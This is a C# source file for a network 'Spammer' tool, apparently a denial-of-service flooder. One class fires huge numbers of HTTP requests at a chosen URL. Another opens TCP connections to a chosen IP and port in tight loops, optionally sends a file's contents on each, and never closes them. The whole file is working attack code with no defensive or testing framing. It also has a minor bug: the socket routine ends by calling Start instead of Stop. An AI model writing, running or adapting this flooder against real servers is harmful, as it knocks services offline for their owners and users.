using System;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net.Sockets;
using Controls;

namespace SocketTracker
{
    class Spammer
    {
        public class Http
        {
            public Http(string url, long loops)
            {
                Url = url; 
                Loops = loops;
            }

            public string Url{get;set;}
            public long Loops{get;set;}

            public async Task StartSpammingAsync()
            {
                await Task.Delay(100);
                
                LoadingDots loading = new LoadingDots("Spamming");
                loading.Start();

                for(long i = 0; i < Loops; i++)
                {
                    for (long b = 0; b < 999999999; b++)
                    {
                        try
                        {
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(Url));

                            client.Dispose();
                        }
                        catch
                        {
                            Console.WriteLine("Server down, unable to connect... Try again");
                            break;
                        }
                    }
                }

                loading.Stop();
            }
        }

        public class Sockets
        {        
            public Sockets(string ip, int port ,long loop ,string filePath)
            {
                Ip = ip;
                Port = port;
                Loops = loop;
                FilePath = filePath;
            }
            
            public Sockets(string ip, int port ,long loop)
            {
                Ip = ip;
                Port = port;
                Loops = loop;
            }

            public int Port{get;set;}
            public string Ip{get;set;}
            public long Loops{get;set;}
            public string FilePath{get;set;}


            public async Task StartSpammingAsync()
            {
                string text = null;
                byte[] data = null;
            
                if(FilePath != null)
                {
                    text = File.ReadAllText(FilePath);
                    data = System.Text.Encoding.ASCII.GetBytes(text);         
                }

                LoadingDots loading = new LoadingDots("Spamming");
                loading.Start();
            
                for(long i = 0; i < Loops; i++)
                {
                    for (long b = 0; b < 999999999; b++)
                    {
                        try
                        {
                            TcpClient client = new TcpClient();
                            await client.ConnectAsync(IPAddress.Parse(Ip), Port);
                        
                            if(FilePath != null)
                            {
                                NetworkStream stream = client.GetStream();

                                await stream.WriteAsync(data, 0, data.Length);
                                await stream.FlushAsync();
                            }
                        }
                        catch
                        {
                            Console.WriteLine("Server down, unable to connect... Try again");
                            break; 
                        }

                    }
                }
                loading.Start();
            }
        }
    }
}